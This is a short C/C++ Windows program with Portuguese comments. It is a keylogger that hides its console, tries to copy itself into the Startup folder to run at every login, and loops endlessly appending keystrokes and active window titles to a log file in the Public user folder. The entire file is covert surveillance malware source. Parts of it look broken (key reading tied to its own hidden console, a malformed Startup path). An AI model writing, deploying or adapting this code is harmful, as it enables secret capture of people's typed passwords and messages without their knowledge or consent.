
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#define PATH "C:\\Users\\Public\\log.txt" // Caminho do arquivo log

char* GetActiveWindowTitle() {
	char* wnd_title = new char[255];
	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowText(hwnd, wnd_title, 255);
	return wnd_title;
}

void esconder() {
	HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

int main() {

    char capture;
    FILE *file;
    esconder(); // Esconder o prompt durante a execução
    CopyFile(".\\a.exe", "%%AppData%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", 0); // Executar na Inicialização do Windows

    while(1) {

		Sleep(20);
    	file = fopen(PATH, "a+");
        Sleep(20);
        if (kbhit()) {
            capture = getch();
            switch ((int)capture) {
                case ' ':
                    fprintf(file, " ");
                    fclose(file);
                    break;
                case 0x09:
                    fprintf(file, "[TAB]");
                    fclose(file);
                    break;
                case 0x0D:
                    fprintf(file, "[ENTER] ");
                    fprintf(file, "%s\r\n", GetActiveWindowTitle()); // Salvar o nome do processo em execução
                    fclose(file);
                    break;
                case 0x1B:
                    fprintf(file, "[ESC]");
                    fprintf(file, "%s\r\n", GetActiveWindowTitle());
                    fclose(file);
                    break;
                case 0x08:
                    fprintf(file, "[BACKSPACE]");
                    fclose(file);
                    break;
                default:
                    fputc(capture, file);
                    fclose(file);
            }
        }
    }
}


